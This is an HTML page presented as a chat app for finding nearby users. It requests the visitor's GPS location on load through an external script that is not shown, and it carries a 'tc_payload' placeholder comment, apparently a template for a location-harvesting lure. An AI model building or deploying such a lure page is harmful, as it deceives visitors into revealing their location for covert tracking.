<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Find Nearby Users - Chat App</title>
  <link rel="stylesheet" href="./style.css">
</head>
<body onload="gpsLocation()">
<section class="chat-wrapper">
  <header class="chat-header">
    <div class="chat-header-title">
      <i class="fas fa-user-friends"></i> Find Nearby Users - Chat App
    </div>
    <div class="chat-header-options">
      <span><i class="fas fa-cog"></i> Settings</span>
    </div>
  </header>

  <main class="chat-window">
    <div class="message left-message">
      <div
       class="message-avatar"
       style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"
      ></div>

      <div class="message-bubble">
        <div class="message-info">
          <div class="message-info-name">Admin</div>
          <div class="message-info-time"></div>
        </div>

        <div class="message-text">
          Welcome to our chat app! Turn on your location to find people near you and start chatting. 📍
        </div>
      </div>
    </div>
  </main>

  <form class="chat-input-area">
    <input type="text" class="chat-input" placeholder="Type your message here...">
    <button type="submit" class="chat-send-btn">Send</button>
  </form>
</section>

<script src="./script.js"></script>
<p id="techchip"></p>
<!-- tc_payload -->
</body>
</html>
